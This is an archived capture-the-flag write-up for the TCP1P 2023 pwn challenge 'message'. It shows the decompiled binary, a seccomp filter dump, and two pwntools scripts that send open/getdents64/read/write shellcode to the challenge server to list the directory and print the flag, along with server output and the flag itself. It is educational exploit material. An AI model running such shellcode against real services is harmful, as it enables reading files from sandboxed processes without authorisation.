# message

**CTF:** TCP1P 2023  
**Category:** pwn  
**Original writeup:** <https://chovid99.github.io/posts/tcp1p-ctf-2023/> — by **chovid99**. All credit goes to the original author; this is an archived copy.

---

message

Description Author: gawrgare What do you want to say to me? nc ctf.tcp1p.com 8008

Solution

This time, we were only given a binary named chall . First, let’s disassemble this binary.

1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 int __cdecl main ( int argc , const char ** argv , const char ** envp ) { void * v4 ; // [rsp+0h] [rbp-10h] void * v5 ; // [rsp+8h] [rbp-8h] v4 = malloc ( 0x150uLL ); v5 = mmap ( 0LL , 0x1000uLL , 7 , 34 , - 1 , 0LL ); setup (); seccomp_setup (); if ( v5 != ( void * ) - 1LL && v4 ) { puts ( "Anything you want to tell me? " ); read ( 0 , v4 , 0x150uLL ); memcpy ( v5 , v4 , 0x1000uLL ); (( void ( * )( void )) v5 )(); free ( v4 ); munmap ( v5 , 0x1000uLL ); return 0 ; } else { perror ( "Allocation failed" ); return 1 ; } }

In summary, it’s clear that we can provide input in the form of shellcode with a maximum length of 0x150 . However, there’s seccomp in place, limiting the syscalls that we can invoke.

To find out what syscalls are allowed, let’s use seccomp-tools first.

1 2 3 4 5 6 7 8 9 10 11 12 13 14 seccomp - tools dump ./ chall line CODE JT JF K ================================= 0000 : 0x20 0x00 0x00 0x00000004 A = arch 0001 : 0x15 0x00 0x08 0xc000003e if ( A != ARCH_X86_64 ) goto 0010 0002 : 0x20 0x00 0x00 0x00000000 A = sys_number 0003 : 0x35 0x00 0x01 0x40000000 if ( A < 0x40000000 ) goto 0005 0004 : 0x15 0x00 0x05 0xffffffff if ( A != 0xffffffff ) goto 0010 0005 : 0x15 0x03 0x00 0x00000000 if ( A == read ) goto 0009 0006 : 0x15 0x02 0x00 0x00000001 if ( A == write ) goto 0009 0007 : 0x15 0x01 0x00 0x00000002 if ( A == open ) goto 0009 0008 : 0x15 0x00 0x01 0x000000d9 if ( A != getdents64 ) goto 0010 0009 : 0x06 0x00 0x00 0x7fff0000 return ALLOW 0010 : 0x06 0x00 0x00 0x00000000 return KILL

There are 4 allowed syscalls , namely read , write , open , and getdents64 . First, let’s identify the name of the flag file using getdents64 . We need to create shellcode that will execute the following instructions:

open('./', os.O_DIRECTORY)

getdents64(3, 'rsp', 0x100)

write(1, 'rsp', 0x100)

To simplify the exploitation, we can use pwntools . Here is the script I used:

1 2 3 4 5 6 7 8 9 10 11 12 13 14 from pwn import * import os context . arch = 'amd64' context . encoding = 'latin' context . log_level = 'INFO' warnings . simplefilter ( "ignore" ) r = remote ( 'ctf.tcp1p.com' , 8008 ) payload = asm ( shellcraft . open ( './' , os . O_DIRECTORY )) payload += asm ( shellcraft . getdents64 ( 3 , 'rsp' , 0x100 )) payload += asm ( shellcraft . write ( 1 , 'rsp' , 0x100 )) r . send ( payload ) r . interactive ()

1 2 3 Anything you want to tell me? Y`0\x00\x00\x00\x00\x00\x00\x00\x00.\x00\x00W`0\x00\x00\x00\x00\x00\x00\x00\x00..\x00\x00`0\x00\x00\x00\x00\x00\x00\x00\x00flag-3462d01f8e1bcc0d8318c4ec420dd482a82bd8b650d1e43bfc4671cf9856ee90.txt\x00\xdb39`0\x00\x00\x00\x00\x00\x00\x00\x00run_challenge.sh\x00\x00\x00_0\x00\x00\x00\x00\x00\x00\x00\x00chall\x00\xfc \xfe\xf5_0\x00\x00\x06\x00\x00\x00\x18\x04in\x00\x00\x00\x00

We can see that the flag’s filename is flag-3462d01f8e1bcc0d8318c4ec420dd482a82bd8b650d1e43bfc4671cf9856ee90.txt . Let’s promptly create new shellcode to read that flag using a combination of open-read-write .

1 2 3 4 5 6 7 8 9 10 11 12 13 14 from pwn import * import os context . arch = 'amd64' context . encoding = 'latin' context . log_level = 'INFO' warnings . simplefilter ( "ignore" ) r = remote ( 'ctf.tcp1p.com' , 8008 ) payload = asm ( shellcraft . open ( 'flag-3462d01f8e1bcc0d8318c4ec420dd482a82bd8b650d1e43bfc4671cf9856ee90.txt' )) payload += asm ( shellcraft . read ( 3 , 'rsp' , 0x100 )) payload += asm ( shellcraft . write ( 1 , 'rsp' , 0x100 )) r . send ( payload ) r . interactive ()

1 2 Anything you want to tell me? TCP1P{I_pr3fer_to_SAY_ORGW_rather_th4n_OGRW_d0nt_y0u_th1nk_so??}6ee90.txt\x00\x00\x00\x00\xf4\xb8=V\x00\xa0\xe22=V\x00\x00\xbdm"\x7f\x00\x00\x00\x00\x00\xed\x97m"\x7f\x00\x00\x00\x00\x00\xb7\xf3\xb8=V\x00\x00\x00\x00\x00\xed\xaeR\xff\x7f\x00\x00\x00\x00\x00\x83IwLG\xc2\xa1\x18\xaeR\xff\x7f\x00\xb7\xf3\xb8=V\x00X\x1d\x15V\x00@\xb0\xbdm"\x7f\x00\x83IU\x94\x1a\xff^\x83I\xfd\x96hE_\x00\x00\x00\x00\x00

Flag: TCP1P{I_pr3fer_to_SAY_ORGW_rather_th4n_OGRW_d0nt_y0u_th1nk_so??}
